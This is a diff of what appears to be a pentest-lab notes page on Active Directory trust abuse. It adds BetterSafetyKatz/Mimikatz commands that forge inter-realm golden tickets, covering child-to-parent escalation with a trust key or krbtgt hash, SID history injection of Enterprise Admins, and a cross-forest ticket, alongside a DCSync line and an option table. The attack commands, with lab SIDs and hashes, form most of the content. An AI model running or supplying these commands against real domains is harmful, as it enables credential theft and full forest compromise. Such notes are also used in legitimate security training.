@@ -25,30 +25,41 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
 
 ### Forge the Inter-Realm TGT
 
+Note that krbtgt can be used instead of the trust key.
+
 {% code overflow="wrap" %}
 ```powershell
+# Child to parent 
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+
+# Using krbtgt hash
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
+
+# Across Forest
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:2756bdf7dd8ba8e9c40fe60f654115a0 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit" 
 ```
 {% endcode %}
 
-| Options                            |                                                         |
-| ---------------------------------- | ------------------------------------------------------- |
+| Options                            |                                                  |
+| ---------------------------------- | ------------------------------------------------ |
 | <pre><code>/domain:
-</code></pre>  | FQDN of the current domain                              |
+</code></pre>  | FQDN of the current domain                       |
 | <pre><code>/sid:
-</code></pre>     | SID of the current domain                               |
+</code></pre>     | SID of the current domain                        |
 | <pre><code>/sids
-</code></pre>     | SID of the enterprise admins group of the parent domain |
+</code></pre>     | SID to be injected to the SID history            |
 | <pre><code>/rc4:
-</code></pre>     | RC4 of the trust key                                    |
+</code></pre>     | RC4 of the trust key                             |
+| <pre><code>/krbtgt:
+</code></pre>  | krbtgt hash can be used instead of the Trust Key |
 | <pre><code>/user:
-</code></pre>    | User to impersonate                                     |
+</code></pre>    | User to impersonate                              |
 | <pre><code>/service:
-</code></pre> | Target service in the parent domain                     |
+</code></pre> | Target service in the parent domain              |
 | <pre><code>/target:
-</code></pre>  | FQDN of the parent domain                               |
+</code></pre>  | FQDN of the parent domain                        |
 | <pre><code>/ticket
-</code></pre>   | Path to save the ticket                                 |
+</code></pre>   | Path to save the ticket                          |
 
 ### Request the TGS and pass it
 
